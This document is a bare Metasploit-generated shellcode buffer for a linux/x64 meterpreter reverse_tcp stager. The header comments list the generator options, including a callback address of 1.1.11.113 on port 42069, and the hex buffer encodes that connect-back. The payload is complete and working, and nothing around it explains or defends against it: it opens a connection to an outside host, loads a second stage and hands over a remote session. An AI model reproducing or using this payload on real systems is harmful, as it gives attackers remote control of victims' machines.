# linux/x64/meterpreter/reverse_tcp - 130 bytes (stage 1)
# https://metasploit.com/
# VERBOSE=false, LHOST=1.1.11.113, LPORT=42069, 
# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
# StagerRetryCount=10, StagerRetryWait=5, AutoLoadStdapi=true, 
# AutoVerifySession=true, AutoVerifySessionTimeout=30, 
# InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
# EnableUnicodeEncoding=false, SessionRetryTotal=3600, 
# SessionRetryWait=10, SessionExpirationTimeout=604800, 
# SessionCommunicationTimeout=300, PayloadProcessCommandLine=, 
# AutoUnhookProcess=false, PingbackRetries=0, 
# PingbackSleep=30, PayloadUUIDTracking=false, 
# EnableStageEncoding=false, StageEncoderSaveRegisters=, 
# StageEncodingFallback=true, PrependFork=false, 
# PrependSetresuid=false, PrependSetreuid=false, 
# PrependSetuid=false, PrependSetresgid=false, 
# PrependSetregid=false, PrependSetgid=false, 
# PrependChrootBreak=false, AppendExit=false, 
# MeterpreterDebugLevel=0, RemoteMeterpreterDebugFile=
buf = 
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31" +
"\xc9\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51" +
"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01" +
"\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00" +
"\xa4\x55\x01\x01\x0b\x71\x51\x48\x89\xe6\x6a\x10\x5a\x6a" +
"\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74" +
"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31" +
"\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58" +
"\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0" +
"\x78\xed\xff\xe6"
